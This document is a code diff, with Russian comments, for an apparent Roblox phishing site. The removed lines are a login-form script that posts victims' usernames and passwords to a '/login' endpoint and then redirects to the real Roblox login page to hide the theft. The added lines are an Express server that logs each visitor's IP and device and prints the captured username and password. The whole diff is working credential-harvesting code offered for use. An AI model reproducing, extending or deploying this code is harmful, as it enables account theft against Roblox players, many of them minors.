@@ -1,36 +1,57 @@
-document.addEventListener("DOMContentLoaded", () => {
-    const loginForm = document.getElementById('loginForm');
-    
-    if (loginForm) {
-        loginForm.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            
-            // ИСПРАВЛЕНО: теперь ищем класс .demo-submit, который ты используешь в HTML
-            const loginBtn = document.querySelector('.demo-submit');
-            
-            if (loginBtn) {
-                loginBtn.textContent = "Загрузка...";
-                loginBtn.disabled = true;
-            }
+const express = require('express');
+const app = express();
+const path = require('path');
+const fs = require('fs');
 
-            try {
-                // Отправляем данные на твой сервер на Render
-                await fetch('/login', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ username, password })
-                });
-            } catch (error) {
-                console.error("Ошибка:", error);
-            }
+app.disable('x-powered-by');
+app.set('trust proxy', true);
 
-            // Задержка и редирект на настоящий Roblox
-            setTimeout(() => {
-                window.location.href = "https://www.roblox.com/login";
-            }, 1500);
-        });
+// Позволяем серверу читать JSON из запросов
+app.use(express.json());
+
+// 🌐 ЛОГГЕР ПОСЕЩЕНИЙ
+app.use((req, res, next) => {
+    if (req.method === 'GET' && (req.path === '/' || req.path === '/index.html')) {
+        const ip = req.ip || req.connection.remoteAddress;
+        const userAgent = req.headers['user-agent'] || 'Неизвестное устройство';
+        const time = new Date().toLocaleString('ru-RU');
+        
+        console.log('\n====================================');
+        console.log(`🌐 НОВЫЙ ПОСЕТИТЕЛЬ ЗАШЕЛ НА САЙТ!`);
+        console.log(`📍 IP: ${ip}`);
+        console.log(`💻 Устройство: ${userAgent}`);
+        console.log(`⏰ Время: ${time}`);
+        console.log('====================================\n');
     }
+    next();
+});
+
+// 🔥 ОБРАБОТКА ЛОГИНОВ И ПАРОЛЕЙ
+app.post('/login', (req, res) => {
+    const { username, password } = req.body;
+    
+    console.log('\n====================================');
+    console.log(`🔥 НОВЫЙ ЛОГИН!`);
+    console.log(`👤 Юзер: ${username}`);
+    console.log(`🔑 Пароль: ${password}`);
+    console.log(`⏰ Время: ${new Date().toLocaleString('ru-RU')}`);
+    console.log('====================================\n');
+
+    res.status(200).send('OK');
+});
+
+// Фикс MIME-типа для картинки фона (чтобы браузер не тупил)
+app.get('/bg.jpg', (req, res, next) => {
+    res.type('png');
+    const stream = fs.createReadStream(path.join(__dirname, 'bg.jpg'));
+    stream.on('error', next);
+    stream.pipe(res);
+});
+
+// Раздаем статические файлы
+app.use(express.static(__dirname));
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+    console.log(`Сервер запущен на порту ${PORT}`);
 });
